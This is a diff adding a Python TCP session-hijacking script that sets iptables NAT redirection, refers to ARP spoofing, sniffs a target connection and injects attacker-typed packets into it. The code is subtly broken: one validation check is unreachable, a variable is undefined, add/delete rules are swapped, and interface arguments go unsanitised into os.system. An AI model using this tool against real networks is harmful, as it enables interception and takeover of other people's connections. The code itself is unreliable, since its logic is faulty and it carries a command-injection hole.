@@ -1,0 +1,108 @@
+#! /usr/bin/python3
+import argparse
+import signal
+import time
+import sys
+import os
+import re
+from libs import spoofing
+from libs import sniffer
+from libs import packet
+
+class settings:
+    ip = ""
+    mac = ""
+    src = ""
+    dst = ""
+    port = 0
+    cmd_list = []
+
+def main():
+    global settings
+    print ("""
+        █▐▒▒░░■· ▀█▀   ▀█▀ ▀███   ▀██▀ mitm
+        █      ■· ▀▀▌  █▀   ████   ██
+        █       ■·  ▀▀██    ██ ██  ██ 
+        █       ■·   █▀     ██  ██ ██
+        █      ■·  ░█▀      ██   ████
+        █▐▒▒░░■·  ▄█▀      ▄██▄   ███
+    """)
+
+    parser = argparse.ArgumentParser()
+
+    parser.add_argument("--own", required=False, help="Own mac:ip")
+    parser.add_argument("iface", help="")
+    parser.add_argument("src", help="Source ip")
+    parser.add_argument("dst", help="Destination ip")
+    parser.add_argument("port", help="Destination port")
+    parser.add_argument("--verbose", help="Display more informations", action="store_true", default=False)
+
+    args = parser.parse_args()
+
+    ip_reg = re.compile('^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)(\.(?!$)|$)){4}$')
+    mac_reg = re.compile('^(([0-9a-f]{2})(:(?!$)|$)){6}$', re.IGNORECASE)
+    port_reg = re.compile('^((6553[0-5])|(655[0-2][0-9])|(65[0-4][0-9]{2})|(6[0-4][0-9]{3})|([1-5][0-9]{4})|([0-5]{0,5})|([0-9]{1,4}))$')
+    if os.geteuid() != 0:
+        print("this program should be run as root.")
+        exit()
+    if len(args.src) == 0 or len(args.dst) == 0 or len(args.port) == 0:
+        print("invalid arguments.")
+        exit() 
+        print("Invalid sources ip address!")
+        exit()
+    elif not ip_reg.match(args.dst):
+        print("Invalid destination ip address!")
+        exit()
+    elif not port_reg.match(args.port):
+        print("Invalid target port!")
+        exit()
+    settings.src = args.src
+    settings.dst = args.dst
+    settings.port = args.port
+    settings.iface = args.iface
+    #enabling firewall redirection.
+    if args.own is not None:
+        if len(args.own) != 0:
+            settings.ip = args.own.split(":")[0]
+            settings.mac = args.own.split(":")[1]
+            if not mac_reg.match(own_mac):
+                print("Invalid mac address!")
+                exit()
+            print("arp spoofing mac, sleeping 5seconds")
+    # TODO: Delete this rule after program is running
+    print("trying:")
+    print("iptables -t nat -A POSTROUTING -o "+settings.iface+" -s "+settings.src+" -p tcp --dport "+settings.port+" -j SNAT --to 127.0.0.1:"+settings.port)
+    os.system("iptables -t nat -A POSTROUTING -o "+settings.iface+" -s "+settings.src+" -p tcp --dport "+settings.port+" -j SNAT --to 127.0.0.1:"+settings.port)
+    settings.cmd_list.append("iptables -D POSTROUTING -o "+settings.iface+" -s "+settings.src+" -p tcp --dport "+settings.port+" -j SNAT --to 127.0.0.1:"+settings.port)
+    if args.own is not None and len(settings.ip) == 0:
+        print("trying:")
+        print("iptables -D POSTROUTING -o "+settings.iface+" -j SNAT --to "+settings.ip)
+        # TODO: Delete this rule after program is running
+        os.system("iptables -D POSTROUTING -o "+settings.iface+" -j SNAT --to "+settings.ip)
+        settings.cmd_list.append("iptables -t nat -A POSTROUTING -o "+settings.iface+" -j SNAT --to "+settings.ip)
+        #spoofer.start(settings.ip, settings.src, settings.dst)
+        time.sleep(5)
+    #injector.init()
+    sniffer.start(settings.src, settings.dst, settings.port)
+    if sniffer.inject_packet == False:
+        print("Failed to get a packet sample.")
+        exit()
+    print("Connection hijacked, terminal:")
+    packet.receive()
+    while True:
+        payload = sys.stdin.readline()
+        ready = packet.create_psh(payload)
+        packet.send(ready)
+
+def on_exit(*_):
+    global settings
+    print("Killing threads and exiting...")
+    sniffer.stop()
+    packet.kill_switch = True
+    for cmd in settings.cmd_list:
+        os.system(cmd)
+    sys.exit()
+
+if __name__ == "__main__":
+    signal.signal(signal.SIGINT, on_exit)
+    main()
